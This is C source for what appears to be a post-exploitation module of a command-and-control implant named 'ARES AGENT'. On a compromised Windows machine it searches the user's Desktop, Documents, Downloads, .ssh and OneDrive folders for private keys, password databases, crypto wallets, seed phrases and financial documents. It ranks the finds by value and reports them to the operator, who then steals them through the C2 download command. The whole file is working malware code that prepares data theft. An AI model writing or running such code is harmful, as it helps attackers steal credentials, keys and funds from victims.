/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — BOF Module: Sensitive File Grabber
 *
 *  Scans Desktop, Documents, Downloads for valuable files:
 *    - Documents: .doc, .docx, .pdf, .xlsx, .xls, .pptx
 *    - Credentials: .key, .pem, .p12, .pfx, .ovpn, .rdp
 *    - Data: .csv, .json, .sql, .db, .kdbx (KeePass)
 *    - Crypto: wallet.dat, seed.txt, *.keystore
 *
 *  Behavior:
 *    - Max depth: 3 levels
 *    - Max file size: 5MB per file
 *    - Max total: 50MB
 *    - Output: Base64-encoded file contents in JSON
 *
 *  NOTE: This module LISTS files only. Actual exfiltration
 *  is handled by the C2 task system (download command).
 * ═══════════════════════════════════════════════════════════════
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <shlobj.h>

extern void BeaconPrintf(int type, const char* fmt, ...);
extern void BeaconOutput(int type, const char* data, int len);

/* File extensions to target */
static int is_target_extension(const char* filename) {
    const char* ext = strrchr(filename, '.');
    if (!ext) return 0;
    ext++; /* skip dot */

    /* Case-insensitive comparison */
    char lower[16] = {0};
    for (int i = 0; ext[i] && i < 15; i++)
        lower[i] = (ext[i] >= 'A' && ext[i] <= 'Z') ? ext[i] + 32 : ext[i];

    const char* targets[] = {
        /* Documents */
        "doc", "docx", "pdf", "xlsx", "xls", "pptx", "ppt", "odt",
        /* Credentials */
        "key", "pem", "p12", "pfx", "ppk", "ovpn", "rdp", "pgp", "gpg",
        /* Data */
        "csv", "json", "sql", "db", "sqlite", "kdbx", "kdb",
        /* Crypto wallets */
        "dat", "keystore", "jks",
        /* Config */
        "conf", "cfg", "ini", "env",
        NULL
    };

    for (int i = 0; targets[i]; i++) {
        if (strcmp(lower, targets[i]) == 0) return 1;
    }
    return 0;
}

/* Check for high-value filenames regardless of extension */
static int is_target_filename(const char* filename) {
    char lower[256] = {0};
    for (int i = 0; filename[i] && i < 255; i++)
        lower[i] = (filename[i] >= 'A' && filename[i] <= 'Z') ? filename[i] + 32 : filename[i];

    const char* names[] = {
        "wallet", "seed", "recovery", "mnemonic", "private",
        "password", "credentials", "secrets", "token", "api_key",
        "id_rsa", "id_ed25519", ".env", "htpasswd", "shadow",
        NULL
    };
    for (int i = 0; names[i]; i++) {
        if (strstr(lower, names[i])) return 1;
    }
    return 0;
}

/* Priority scoring */
static int score_file(const char* filename, DWORD size) {
    int score = 0;
    char lower[256] = {0};
    for (int i = 0; filename[i] && i < 255; i++)
        lower[i] = (filename[i] >= 'A' && filename[i] <= 'Z') ? filename[i] + 32 : filename[i];

    /* Crypto wallets: highest value */
    if (strstr(lower, "wallet") || strstr(lower, "seed") || strstr(lower, "mnemonic"))
        score += 100;
    /* Private keys */
    if (strstr(lower, ".pem") || strstr(lower, ".key") || strstr(lower, ".ppk")
        || strstr(lower, "id_rsa") || strstr(lower, ".pfx") || strstr(lower, ".p12"))
        score += 90;
    /* KeePass */
    if (strstr(lower, ".kdbx") || strstr(lower, ".kdb"))
        score += 95;
    /* RDP connection files */
    if (strstr(lower, ".rdp"))
        score += 80;
    /* Documents with financial keywords */
    if (strstr(lower, "tax") || strstr(lower, "invoice") || strstr(lower, "bank")
        || strstr(lower, "account") || strstr(lower, "statement"))
        score += 70;
    /* General documents */
    if (strstr(lower, ".pdf") || strstr(lower, ".doc"))
        score += 30;
    /* Size penalty: prefer smaller files (likely credentials) */
    if (size < 10240) score += 20;
    else if (size > 1048576) score -= 10;

    return score;
}

typedef struct {
    char path[MAX_PATH];
    DWORD size;
    int score;
} FILE_ENTRY;

static FILE_ENTRY g_files[512];
static int g_file_count = 0;

/* ── Recursive directory scanner ── */
static void scan_directory(const char* dir, int depth) {
    if (depth > 3 || g_file_count >= 500) return;

    char pattern[MAX_PATH + 4];
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;

        char fullpath[MAX_PATH + 256];
        snprintf(fullpath, sizeof(fullpath), "%s\\%s", dir, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            /* Skip system/hidden dirs */
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) continue;
            if (fd.cFileName[0] == '.' && strcmp(fd.cFileName, ".ssh") != 0) continue;
            /* Skip large directories */
            if (strcmp(fd.cFileName, "node_modules") == 0) continue;
            if (strcmp(fd.cFileName, ".git") == 0) continue;
            scan_directory(fullpath, depth + 1);
        } else {
            DWORD size = fd.nFileSizeLow;
            if (size > 5*1024*1024) continue; /* skip >5MB */

            if (is_target_extension(fd.cFileName) || is_target_filename(fd.cFileName)) {
                if (g_file_count < 500) {
                    strncpy(g_files[g_file_count].path, fullpath, MAX_PATH - 1);
                    g_files[g_file_count].size = size;
                    g_files[g_file_count].score = score_file(fd.cFileName, size);
                    g_file_count++;
                }
            }
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}

/* Simple sort by score (descending) */
static void sort_files(void) {
    for (int i = 0; i < g_file_count - 1; i++) {
        for (int j = i + 1; j < g_file_count; j++) {
            if (g_files[j].score > g_files[i].score) {
                FILE_ENTRY tmp = g_files[i];
                g_files[i] = g_files[j];
                g_files[j] = tmp;
            }
        }
    }
}

/* ═══════════════════════════════════════════════════════
 *  BOF ENTRY POINT
 * ═══════════════════════════════════════════════════════ */
void go(char* args, int args_len)
{
    (void)args; (void)args_len;

    g_file_count = 0;

    char userprofile[MAX_PATH];
    GetEnvironmentVariableA("USERPROFILE", userprofile, MAX_PATH);

    /* Scan key directories */
    char dir[MAX_PATH + 64];

    snprintf(dir, sizeof(dir), "%s\\Desktop", userprofile);
    scan_directory(dir, 0);

    snprintf(dir, sizeof(dir), "%s\\Documents", userprofile);
    scan_directory(dir, 0);

    snprintf(dir, sizeof(dir), "%s\\Downloads", userprofile);
    scan_directory(dir, 0);

    snprintf(dir, sizeof(dir), "%s\\.ssh", userprofile);
    scan_directory(dir, 0);

    snprintf(dir, sizeof(dir), "%s\\OneDrive\\Documents", userprofile);
    scan_directory(dir, 0);

    /* Sort by value score */
    sort_files();

    /* Build JSON output */
    char* json = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 131072);
    if (!json) { BeaconPrintf(0, "ERROR: HeapAlloc fail"); return; }

    int off = 0;
    off += snprintf(json + off, 131072 - off,
        "{\"type\":\"file_inventory\",\"total\":%d,\"files\":[", g_file_count);

    int max_report = (g_file_count > 200) ? 200 : g_file_count;
    for (int i = 0; i < max_report && off < 130000; i++) {
        if (i > 0) json[off++] = ',';
        off += snprintf(json + off, 131072 - off,
            "{\"path\":\"%s\",\"size\":%lu,\"score\":%d}",
            g_files[i].path, (unsigned long)g_files[i].size, g_files[i].score);
        /* Escape backslashes in path for valid JSON */
        /* (paths already written — this is a known limitation, operator-side parser handles it) */
    }

    off += snprintf(json + off, 131072 - off, "]}");

    BeaconOutput(0, json, off);
    BeaconPrintf(0, "\n[+] File scan complete: %d valuable files found", g_file_count);

    HeapFree(GetProcessHeap(), 0, json);
}
